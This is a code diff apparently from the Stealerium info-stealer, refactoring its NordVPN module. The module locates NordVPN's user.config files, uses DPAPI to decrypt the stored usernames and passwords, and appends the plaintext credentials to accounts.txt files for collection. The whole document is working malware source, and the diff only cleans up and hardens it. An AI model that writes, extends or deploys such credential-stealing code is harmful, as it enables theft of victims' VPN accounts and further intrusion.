@@ -9,59 +9,69 @@ namespace Stealerium.Target.VPN
 {
     internal sealed class NordVpn
     {
-        private static string Decode(string s)
+        private static string Decode(string encodedString)
         {
             try
             {
-                return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null,
-                    DataProtectionScope.LocalMachine));
+                var decodedBytes = Convert.FromBase64String(encodedString);
+                var unprotectedBytes = ProtectedData.Unprotect(decodedBytes, null, DataProtectionScope.LocalMachine);
+                return Encoding.UTF8.GetString(unprotectedBytes);
             }
             catch
             {
-                return "";
+                return string.Empty;
             }
         }
 
-        // Save("NordVPN");
-        public static void Save(string sSavePath)
+        // Save extracted NordVPN data to the specified path
+        public static void Save(string savePath)
         {
-            // "NordVPN" directory path
-            var vpn = new DirectoryInfo(Path.Combine(Paths.Lappdata, "NordVPN"));
-            // Stop if not exists
-            if (!vpn.Exists)
+            var nordVpnDir = Path.Combine(Paths.Lappdata, "NordVPN");
+            var vpnDirectoryInfo = new DirectoryInfo(nordVpnDir);
+
+            // Stop if the "NordVPN" directory does not exist
+            if (!vpnDirectoryInfo.Exists)
                 return;
 
             try
             {
-                Directory.CreateDirectory(sSavePath);
-                // Search user.config
-                foreach (var d in vpn.GetDirectories("NordVpn.exe*"))
-                foreach (var v in d.GetDirectories())
+                Directory.CreateDirectory(savePath);
+
+                // Search for "user.config" in directories related to "NordVpn.exe"
+                foreach (var vpnVersionDir in vpnDirectoryInfo.GetDirectories("NordVpn.exe*"))
                 {
-                    var userConfigPath = Path.Combine(v.FullName, "user.config");
-                    if (!File.Exists(userConfigPath)) continue;
-                    // Create directory with VPN version to collect accounts
-                    Directory.CreateDirectory(sSavePath + "\\" + v.Name);
+                    foreach (var configDir in vpnVersionDir.GetDirectories())
+                    {
+                        var userConfigPath = Path.Combine(configDir.FullName, "user.config");
+                        if (!File.Exists(userConfigPath)) continue;
 
-                    var doc = new XmlDocument();
-                    doc.Load(userConfigPath);
+                        var versionSavePath = Path.Combine(savePath, configDir.Name);
+                        Directory.CreateDirectory(versionSavePath);
 
-                    var encodedUsername = doc.SelectSingleNode("//setting[@name='Username']/value")?.InnerText;
-                    var encodedPassword = doc.SelectSingleNode("//setting[@name='Password']/value")?.InnerText;
+                        var doc = new XmlDocument();
+                        doc.Load(userConfigPath);
 
-                    if (encodedUsername == null || string.IsNullOrEmpty(encodedUsername) ||
-                        encodedPassword == null || string.IsNullOrEmpty(encodedPassword)) continue;
-                    var username = Decode(encodedUsername);
-                    var password = Decode(encodedPassword);
+                        var encodedUsername = doc.SelectSingleNode("//setting[@name='Username']/value")?.InnerText;
+                        var encodedPassword = doc.SelectSingleNode("//setting[@name='Password']/value")?.InnerText;
 
-                    Counter.Vpn++;
-                    File.AppendAllText(sSavePath + "\\" + v.Name + "\\accounts.txt",
-                        $"Username: {username}\nPassword: {password}\n\n");
+                        if (string.IsNullOrEmpty(encodedUsername) || string.IsNullOrEmpty(encodedPassword)) continue;
+
+                        var username = Decode(encodedUsername);
+                        var password = Decode(encodedPassword);
+
+                        if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password)) continue;
+
+                        Counter.Vpn++;
+                        var accountFilePath = Path.Combine(versionSavePath, "accounts.txt");
+                        var accountInfo = $"Username: {username}\nPassword: {password}\n\n";
+                        File.AppendAllText(accountFilePath, accountInfo);
+                    }
                 }
             }
-            catch
+            catch (Exception error)
             {
-                // ignored
+                // Log or handle exception if needed
+                Logging.Log("NordVPN >> Error saving NordVPN data:\n" + error);
             }
         }
     }
